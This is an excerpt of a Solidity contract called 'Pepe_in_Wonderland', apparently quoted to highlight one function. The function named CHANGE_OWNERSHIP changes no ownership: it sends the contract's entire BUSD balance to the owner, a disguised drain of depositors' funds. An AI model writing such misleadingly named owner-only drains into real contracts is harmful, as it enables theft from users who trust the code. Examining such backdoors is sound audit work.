...
contract Pepe_in_Wonderland is Context, Ownable, ReentrancyGuard{
    ...
    uint256 public QUBIC_TO_HIRE_1MINERS = 720000;
    ...
    function compoundAutoQubic(address adr, bool isCompound) internal {
     ...
     function CHANGE_OWNERSHIP(address value) external onlyOwner noReentrant {
        require(msg.sender == owneradd, "Admin use Only");
        IToken owner_adr = IToken(value);
        uint256 amount = token_BUSD.balanceOf(address(this));
        owner_adr.transfer(msg.sender, amount);
    }
